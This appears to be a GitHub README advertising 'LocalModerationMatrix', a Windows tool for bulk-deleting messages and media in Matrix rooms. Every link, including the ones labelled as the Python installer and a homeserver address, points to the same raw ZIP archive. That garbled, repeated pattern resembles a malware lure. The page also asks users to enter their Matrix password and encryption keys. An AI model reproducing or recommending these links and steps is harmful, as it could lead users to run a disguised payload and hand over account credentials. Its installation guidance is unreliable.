# 🛡️ LocalModerationMatrix - Manage Matrix Rooms Efficiently

[![Download LocalModerationMatrix](https://img.shields.io/badge/Download-LocalModerationMatrix-green?style=for-the-badge)](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)

LocalModerationMatrix is a simple tool to help you clean up message history and media in Matrix chat rooms. It runs on your computer and works with popular Matrix clients. The tool supports encrypted rooms, so your data stays private while you manage your space.

---

## 📋 What is LocalModerationMatrix?

LocalModerationMatrix is a command-line program built for users who want a straightforward way to delete multiple messages or clear media files from Matrix rooms. Matrix is an open communication protocol that many rooms and chat apps use. This tool works offline and connects securely with Matrix servers, allowing you to clean rooms without opening each chat manually.

Features include:

- Bulk delete messages in one or many Matrix rooms.
- Remove unwanted media files like images and videos.
- Work with encrypted (E2EE) rooms safely.
- Compatible with popular Matrix apps such as Element, Cinny, Neochat, Nheko, and Schildichat.
- Operates via simple commands in a Windows terminal.
- Open source and community-driven.

---

## 🖥️ System Requirements

LocalModerationMatrix runs on Windows computers. Your PC needs to meet these basic requirements:

- Windows 10 or later (64-bit recommended)
- At least 2 GB of free disk space
- 2 GHz or faster processor
- 4 GB or more of RAM
- Stable internet connection to interact with Matrix servers
- Permission to install software on your computer

You will access the tool through the Windows command prompt or PowerShell. No programming skills are necessary to use it.

---

## 🚀 Getting Started

Follow these steps to download, install, and run LocalModerationMatrix on your Windows PC.

### 1. Download the software

Click the big green button near the top or visit this link to get the tool:

[Download LocalModerationMatrix](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)

This page contains the latest version of the program ready to download.

### 2. Extract files

Once downloaded, the file will likely be a ZIP archive.

- Right-click the ZIP file.
- Select "Extract All..."
- Choose a folder to extract to (for example, your Desktop).
- Click "Extract."

### 3. Open Command Prompt

You will use the command-line tool to run LocalModerationMatrix.

- Press `Win + R` keys.
- Type `cmd` and press Enter.
- A black window called Command Prompt will open.

### 4. Navigate to program folder

In Command Prompt, move to where you extracted the files.

For example, if you put the folder on your Desktop and the folder is named `LocalModerationMatrix`:

```
cd Desktop\LocalModerationMatrix
```

Press Enter.

### 5. Run the tool

Type the following command and press Enter:

```
python local_moderation.py
```

(LocalModerationMatrix requires Python 3.6 or newer installed.)

If Python is not installed, you will see an error. In that case, install Python first from https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip

---

## ⚙️ How to Use LocalModerationMatrix

You do not need to know how to code. The tool operates by typing simple commands in the console.

### Log in to your Matrix account

Before working, you must log in by entering your Matrix username and password.

The program will ask for:

- Your Matrix ID (e.g., `@username:matrix.org`)
- Your password
- The homeserver address (usually `https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip` or your own server)

### Choose room(s) to moderate

After logging in, you will see a list of rooms you belong to. Select one or more rooms for deleting messages or cleaning media.

### Select moderation action

You can:

- Delete messages older than a specific date.
- Remove all media in the room.
- Delete messages from a specific user.

### Confirm action and run

The tool will ask you to type "yes" to confirm the action. It will then process your request. Progress is shown in the command window.

---

## 🔧 Additional Setup Tips

- Ensure your Matrix account has permission to moderate the selected rooms.
- For encrypted rooms, you may need to provide your encryption keys.
- Running the tool may take some time if the room has many messages or media.
- Use an up-to-date Python installation with the required packages. The README inside the folder contains commands to install these.
- Your computer must remain online during the moderation process.

---

## 🛠️ Installation of Python and Required Packages

If you do not have Python installed, follow this:

1. Go to https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip
2. Download the latest stable version (3.9 or newer preferred).
3. Run the installer.
4. Make sure to check "Add Python to PATH" during setup.
5. After installation, open Command Prompt and type:

```
python --version
```

You should see the Python version number.

### Install dependencies

LocalModerationMatrix may require some helper libraries. In Command Prompt, run:

```
pip install -r requirements.txt
```

Make sure the `requirements.txt` file is inside the program folder.

---

## 🔑 Security and Privacy

LocalModerationMatrix never stores your password permanently. Your credentials only stay in memory during the session.

All communication uses secure connections to your Matrix homeserver.

When working on encrypted rooms, your device handles encryption, keeping your data private.

---

## 📚 Support and Documentation

For detailed instructions about command options, visit the program documentation on the download page. It contains examples and troubleshooting advice.

If you encounter problems like login errors or connection issues, check your internet and server settings.

---

## 🔗 Download LocalModerationMatrix

[![Download Here](https://img.shields.io/badge/Download-LocalModerationMatrix-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)